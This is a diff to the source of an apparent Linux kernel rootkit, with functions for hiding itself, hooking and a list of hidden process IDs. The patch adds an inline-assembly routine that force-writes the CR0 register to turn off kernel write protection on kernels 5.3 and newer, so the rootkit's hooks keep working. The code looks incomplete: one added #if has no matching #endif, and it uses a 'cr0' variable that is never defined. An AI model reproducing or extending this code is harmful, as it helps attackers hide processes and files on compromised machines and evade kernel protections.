@@ -29,10 +29,11 @@ macro fucntions && constants
 #define MIN(x,y) ((x) < (y) ? (x) : (y))
 
 
-//clear the WP (write protect) bit in cr0 reg, so cpu can write to readonly pages whilst in ring0 
+//clear the WP (write protect) bit in cr0 reg, so cpu can write to readonly pages whilst in ring0
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5,3,0)
 #define unprotect_memory()	(write_cr0(read_cr0() & (~0x10000)))
-
 #define protect_memory() 	(write_cr0(read_cr0() | 0x10000))
+#endif
 
 
 
@@ -198,7 +199,10 @@ static void 	r00tkit_undo_hook(void);
 
 static void 	r00tkit_hide(void);
 
-
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,3,0)
+static void	write_cr0_forced(unsigned long val);
+static void	protect_memory(void);
+static void	unprotect_memory(void);
 
 /*
 #################
@@ -219,6 +223,31 @@ static filldir_t org_rootfs_filldir;
 ###########################################
 */
 
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,3,0)
+/* needed for hooking */
+static void
+write_cr0_forced(unsigned long val)
+{
+    unsigned long __force_order;
+
+    /* __asm__ __volatile__( */
+    asm volatile(
+        "mov %0, %%cr0"
+        : "+r"(val), "+m"(__force_order));
+}
+
+static void
+protect_memory(void)
+{
+    write_cr0_forced(cr0);
+}
+
+static void
+unprotect_memory(void)
+{
+    write_cr0_forced(cr0 & ~0x00010000);
+}
+#endif
 
 LIST_HEAD(hidden_pids_listhead);
 
